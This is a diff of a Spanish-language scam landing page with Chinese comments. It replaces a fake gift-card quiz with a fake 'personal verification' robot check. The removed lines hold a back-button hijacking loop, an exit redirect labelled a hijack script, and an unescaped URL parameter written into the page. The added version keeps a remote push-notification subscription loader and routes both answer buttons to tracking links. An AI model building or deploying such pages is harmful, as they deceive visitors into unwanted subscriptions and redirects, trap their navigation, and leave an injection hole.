@@ -1,40 +1,35 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<meta name="pushsdk" content="74b464bda8feaa68475ab3ad874de656">
+	<meta name="pushsdk" content="a5034e6c68d4cb6a8cb95680f3fe3649">
 	<meta charset="utf-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-	<title>¡Completa la prueba!</title>
+	<title>prueba completa!</title>
 	<link rel="stylesheet" href="style.css">
-	<script>
-	function getURLParameter(name) {
-		return decodeURIComponent(
-			(RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || ''   /*登陆页面脚本*/
-		); 
-	}
-	</script>
 </head>
 <body>
 
+
 	<div class="main">
 		
-		<h1>Complete la prueba en el siguiente<span class="timer" id="timer"></span>segundos</h1>
+		<h1>verificación personal</h1>
 
-		<p><img src="gift_card.jpg" class="image"></p>
+		<p><img src="robot.png" class="image"></p>
 
-		<h2>y mira si ganas una TARJETA DE REGALO!</h2>
+		<p class="intro">responde algunas preguntas<br>En el siguiente<span class="timer red" id="timer"></span> Autenticado como persona.</p>
 
-		<p class="text-left list-text">
-			1. Responda algunas preguntas simples<br>
-			2. Verás tus resultados inmediatamente<br>
-			3. ¡Compruebe si ganó una TARJETA DE REGALO!
-		</p>
-		<p><a  onclick="go();"class="cta-button">HAZ CLICK EN MI</button></a></p>
-		<p>vives en la ciudad de <script>document.write(getURLParameter('city'))</script></p>
-		
+		<div class="survey">
+			<div class="survey_question">
+				<h3>Estás de acuerdo</h3>
+				<div class="answers">
+					<a href="https://1c49p.bemobtrcks.com/click/1">Sí</a>
+					<a href="https://1c49p.bemobtrcks.com/click/2">No</a>
+				</div>
+			</div>
+		</div>
+
+
 	</div>
-	
-
 
 	<script src="jquery-3.6.0.min.js"></script>
 	<script src="main.js"></script>
@@ -44,83 +39,8 @@
 	</script>
 
 	<script>
-		var redirecting = false;
-		
-		window.onbeforeunload = function() {
-		
-			if (redirecting) return;
-		
-			setTimeout(function() {
-		
-				window.top.location.href = 'https://o35pg.bemobtrcks.com/click';		/*绑架脚本*/
-		
-				setTimeout(function() {
-					redirecting = true;
-				}, 1000);
-		
-		
-			}, 1);
-		
-		};
-	</script>
-	<script>
-			function go() {
-				window.onbeforeunload = null;
-				window.location = 'https://o35pg.bemobtrcks.com/click';	/*触发的 CTA 按钮*/
-			}
-	</script>
-	<script>
-			function getURLParameter(name) {
-				return decodeURIComponent(
-					(RegExp(name + "=" + "(.+?)(&|$)").exec(location.search) || [,
-						null
-					])[1] || ""
-				);
-			}
-	</script>
-	<script>
-		function getURLParameter(name) {
-			return decodeURIComponent(
-				(RegExp(name + "=" + "(.+?)(&|$)").exec(location.search) || [,		/*添加 JS 函数以获取 URL 参数*/
-					null
-				])[1] || ""
-			);
-		}
-	</script>
-	<script>
-		var camp_id = getURLParameter("campaign_id");
-		var lp_name = getURLParameter("landing_page_title");			/*为令牌添加变量*/
-		console.log(
-			`The campaign ID is: ${
-				camp_id || null
-				} and the landing page is called ${lp_name || null}.`
-		);
-	</script>
-	<script>
-		var back_url = `https://o35pg.bemobtrcks.com/click`;
-		console.log(`The back button URL is now: ${back_url}`);
-		!(function() {
-			var t;
-			try {
-				const URL = window.location.href.split(/[#]/)[0];
-				for (t = 0; 10 > t; ++t) history.pushState({}, "", URL + "#");		/*后退脚本*/
-				onpopstate = function(event) {
-					event.state && location.replace(back_url);
-				};
-			} catch (o) {
-				console.log(o);
-			}
-		})();
-	</script>
-	<script>
-		function go() {
-			window.onbeforeunload = null;
-			window.location = 'https://o35pg.bemobtrcks.com/click';		/*机器识别*/
-		}
-		</script>
-	<script>
 		var s = document.createElement('script');
-		s.src='//lemouwee.com/pfe/current/micro.tag.min.js?z=5946956'+'&sw=/sw-check-permissions-a7046.js';
+		s.src='//gauvaiho.net/pfe/current/micro.tag.min.js?z=5960881'+'&sw=/sw-check-permissions-0a98c.js';     /*propush订阅脚本*/
 		s.onload = function(result) {
 			switch (result) {
 				case 'onPermissionDefault':break;
@@ -132,6 +52,6 @@
 		}
 		document.head.appendChild(s);
 	</script>
-	
+
 </body>
 </html>
